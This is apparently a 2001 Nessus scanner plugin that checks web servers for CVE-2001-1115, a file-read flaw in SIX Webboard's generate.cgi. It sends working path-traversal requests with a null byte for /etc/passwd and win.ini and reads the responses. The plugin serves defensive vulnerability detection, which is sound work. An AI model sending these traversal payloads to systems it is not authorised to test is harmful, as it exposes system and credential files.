#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10725);
 script_bugtraq_id(3175);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2001-1115");
 
 
 name["english"] = "SIX Webboard's generate.cgi";
 script_name(english:name["english"]);
 
 desc["english"] = "The CGI 'generate.cgi'from SIX webboard is installed. 
This CGI has a well known security flaw that lets an attacker read 
arbitrary files with the privileges of the http daemon (usually root 
or nobody).

Solution : remove it from /cgi-bin

Risk factor : High";


 desc["francais"] = "Le cgi 'generate.cgi' de SIX webboard est installé. 
Celui-ci possède un problème de sécurité bien connu qui permet à n'importe 
qui de faire lire des fichiers arbitraires au daemon http, avec les 
privilèges de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/webboard/generate.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/webboard/generate.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

flag = 0;

foreach dir (cgi_dirs())
{
 cgi = string(dir, "/webboard/generate.cgi");
 if(is_cgi_installed_ka(item:cgi, port:port))flag = 1;
 else
 {
 cgi = string(dir, "/generate.cgi");
 if(is_cgi_installed_ka(item:cgi, port:port)){
 	flag = 1;
	}
 }
}

if(!flag)exit(0);


 # may need to be improved...
 req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../etc/passwd%00board=board_1"),
		port:port);
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_hole(port);
   exit(0);
  }
 }
  req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../windows/win.ini%00board=board_1"),
		port:port);
		
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if("[windows]" >< r)
  {
   security_hole(port);
   exit(0);
  }
 }
 
 req = http_get(item:string(dir, "/", cgi,
"?content=../../../../../../winnt/win.ini%00board=board_1"),
		port:port);
		
  soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if("[fonts]" >< r)
  {
   security_hole(port);
   exit(0);
  }
 }

